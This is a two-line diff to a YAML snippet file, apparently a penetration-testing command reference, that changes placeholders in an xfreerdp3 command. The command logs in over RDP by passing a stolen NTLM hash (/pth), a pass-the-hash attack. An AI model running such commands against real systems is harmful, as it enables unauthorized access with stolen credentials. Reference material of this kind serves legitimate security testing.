@@ -6,4 +6,4 @@ metadata:
   author: "@TIVKU"
 
 content: |
-  xfreerdp3 -grab-keyboard /u:<USERNAME> /pth:<NT_PART_OF_NTLM> /v:$IP /d:<DOMAIN> /dynamic-resolution
+  xfreerdp3 -grab-keyboard /u:$USER /pth:<NT_PART_OF_NTLM> /v:$IP /d:$DOMAIN /dynamic-resolution
